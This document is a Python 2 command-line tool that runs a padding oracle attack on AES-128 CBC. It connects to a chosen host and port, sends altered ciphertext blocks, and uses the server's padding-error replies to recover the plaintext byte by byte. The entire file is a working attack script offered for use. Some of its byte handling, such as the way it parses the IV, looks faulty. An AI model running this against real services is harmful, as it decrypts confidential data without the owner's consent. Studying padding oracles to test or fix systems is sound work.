#!/bin/python2.7
# coding: UTF-8

# Title : AES128 - CBC Padding Oracle Attack
# Author : Zweisamkeit
# Created : 08/17/2016
# Last modification : 08/18/2016
# Contact : contact@zweisamkeit.fr
# License : GNU/GPL

import socket
import sys

if (len(sys.argv)!=6):
    print "\t\n\nArg error: ./acpadora [Hostname] [Port] [Ciphertext] [Initialization Vector] [Pad Error Message]\n\n"
    exit()

print "\n\n"

print "\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "\tAES128 - CBC Padding Oracle Attack"
print "\t    Zweisamkeit -- 2016     "
print "\t         License GNU/GPL          "
print "\t~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~"
print "\n\n"


print "\tConnecting to server...\n"

server=(sys.argv[1], int(sys.argv[2]))

sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(server)

print "\tConnexion established.\n"

cipher=[]
ctemp=[]

for i in range (0,16):
    ctemp.append("0x"+sys.argv[4][i])
cipher.append(ctemp)

for i in range (0,len(sys.argv[3])/32):
    ctemp=[]
    for j in range (0,16):
        ctemp.append("0x"+(sys.argv[3])[i*32+j*2:i*32+j*2+2])
    cipher.append(ctemp)

result=[]

print "\tLaunching the attack...\n"

number=len(sys.argv[3])/32.

for g in range (int(number),0,-1):
    for h in range (0,16):
        for i in range (0,256):
            ctemp=[]
            for j in range (0,h):
                ctemp.append(hex((h+1)^int(result[j],16)^int(cipher[g-1][15-j],16)))
            ctemp.append(hex(i))
            for j in range (h+1,16):
                ctemp.append('0x00')
            ctemp.reverse()
            csend=[]
            for j in range (0,16):
                csend.append(ctemp[j])
            for j in range (0,16):
                csend.append(cipher[g][j])
            sock.send(''.join(csend).replace("0x","").upper().zfill(len(sys.argv[3])))
            data=sock.recv(1024)
            if (data.find(sys.argv[5])==-1):
                result.append(hex((h+1)^int(cipher[g-1][15-h],16)^int(csend[15-h],16)))
                break
        print "\t\tProgress:",(100./(number)*(number-g))+((h+1)/16.)/(number)*100,"%"

print "\n\tAttack ended.\n"

sock.close()

print "\tConnection closed.\n"

print "\tPlaintext:",''.join([chr(int(i,16)) for i in result[::-1]])

print "\n\n"
